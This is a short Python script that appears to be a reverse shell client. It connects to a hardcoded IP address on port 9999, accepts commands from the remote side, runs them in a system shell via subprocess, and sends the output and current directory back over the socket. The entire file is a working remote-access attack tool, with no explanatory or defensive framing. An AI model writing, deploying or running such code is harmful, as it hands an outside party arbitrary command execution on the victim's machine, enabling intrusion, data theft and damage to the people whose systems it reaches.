import os
import socket
import subprocess
import chardet


sock = socket.socket()
host = '169.254.123.156'
port = 9999
sock.connect((host, port))

while True:
    data = sock.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        try:

            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            enc = chardet.detect(output_bytes)['encoding']
            output_str = output_bytes.decode(encoding=str(enc))           #str(output_bytes, "utf-8")
            cwd = str(os.getcwd()) + ">"
            sock.send(str.encode(output_str + cwd))
            # print(output_str)
            print(chardet.detect(output_bytes))
        except UnicodeDecodeError:
            print(r"Something's wrong with the bytes/symbols")

# Close connection

sock.close()
